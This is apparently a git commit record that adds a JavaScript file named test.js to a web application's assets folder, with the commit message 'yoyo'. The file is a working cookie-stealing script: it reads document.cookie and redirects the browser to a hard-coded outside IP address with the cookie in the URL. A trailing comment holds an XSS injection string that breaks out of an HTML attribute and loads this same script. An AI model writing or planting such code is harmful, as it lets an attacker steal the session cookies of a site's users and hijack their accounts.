70670f87ce10051e492a5436501189b36d5eed4a
zhishenghong <zhishenghong@hengtiansoft.com>
2016-08-19 14:14:04 +0800

    yoyo

---
+++ yoyo-app/src/main/webapp/assets/js/test.js
@@ -0,0 +1,4 @@
+var cookie = document.cookie;
+window.location.href = "http://124.160.91.83:8080/yoyo-app/index.html?cookie="
+		+ escape(cookie);
+/*" hidden><script src="http://124.160.91.83:8080/yoyo-app/assets/js/test.js"></script><input*/
